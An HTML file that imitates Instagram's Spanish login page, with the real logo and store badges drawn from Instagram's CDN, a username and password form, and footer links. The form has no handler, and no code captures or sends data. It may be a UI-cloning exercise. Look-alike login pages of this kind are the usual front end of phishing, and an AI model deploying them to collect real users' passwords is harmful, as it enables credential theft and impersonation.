<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./instagram.png" type="image/x-icon">
    <title>Iniciar sesión • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-white flex justify-center items-center h-screen px-12 flex-col gap-6">
    <div class="p-8 border w-full max-w-sm">
        <div class="mx-auto w-fit mb-12" aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;"><i
                data-visualcompletion="css-img" aria-label="Instagram" class="" role="img"
                style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/ys/r/WBLlWbPOKZ9.png&quot;); background-position: 0px 0px; background-size: 176px 264px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i>
        </div>
        <form>
            <div class="mb-1">
                <input class="mt-1 text-xs p-2 w-full border bg-[#FAFAFA]"
                    placeholder="Teléfono, usuario o correo electrónico"
                    aria-label="Teléfono, usuario o correo electrónico" aria-required="true" autocapitalize="off"
                    autocorrect="off" maxlength="75" dir="" type="text" value="" name="username">
            </div>
            <div class="mb-4">
                <input class="mt-1 text-xs p-2 w-full border bg-[#FAFAFA]" placeholder="Contraseña"
                    aria-label="Contraseña" aria-required="true" autocapitalize="off" autocorrect="off" type="password"
                    value="" name="password">
            </div>
            <button type="submit"
                class="bg-[#1877F2] text-white w-full px-4 py-1 rounded-md hover:bg-blue-600">Entrar</button>
        </form>
        <p class="mt-4 text-xs text-gray-600 text-center cursor-pointer w-fit mx-auto">¿Has olvidado la contraseña?</p>
    </div>
    <div class="border p-5 w-full max-w-sm text-center">
        <p class="">¿No tienes una cuenta? <a
                class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz _a6hd"
                href="/accounts/emailsignup/?next=%2Faccounts%2Flogout%2F" role="link" tabindex="0"><span
                    class="text-[#1877F2]" dir="auto">Regístrate</span></a></p>
    </div>

    <p class="max-w-sm text-center">Descarga la aplicación.</p>
    <div class="flex gap-2">
        <img alt="Descargar de Google Play" class="h-[40px]"
            src="https://static.cdninstagram.com/rsrc.php/v3/yd/r/xOhODS7viZl.png">
        <img alt="Descargar desde Microsoft" class="h-[40px]"
            src="https://static.cdninstagram.com/rsrc.php/v3/y9/r/LjIQEL8csb0.png">
    </div>

    <div class="flex flex-wrap justify-center gap-1 text-xs text-gray-600 mt-12 text-black"><a
            href="https://about.meta.com/" target="_blank" class="text-black">Meta</a><a
            href="https://about.instagram.com/" target="_blank" class="text-black">Información</a><a

            href="/about/jobs/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Empleo</a><a
            href="https://help.instagram.com/" target="_blank" class="text-black">Ayuda</a><a
            href="https://developers.facebook.com/docs/instagram" target="_blank" class="text-black">API</a><a
            href="/legal/privacy/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Privacidad</a><a
            href="/legal/terms/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Condiciones</a><a
            href="/explore/locations/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Ubicaciones</a><a
            href="/web/lite/?next=%2Faccounts%2Flogout%2F" target="_blank" class="text-black">Instagram Lite</a><a
            href="https://www.threads.net/" target="_blank" class="text-black">Threads</a><a
            href="https://www.facebook.com/help/instagram/261704639352628?next=%2Faccounts%2Flogout%2F" target="_blank"
            class="text-black">Subir contactos y personas no usuarias</a><a
            href="https://about.meta.com/technologies/meta-verified/" target="_blank" class="text-black">Meta
            Verified</a></div>
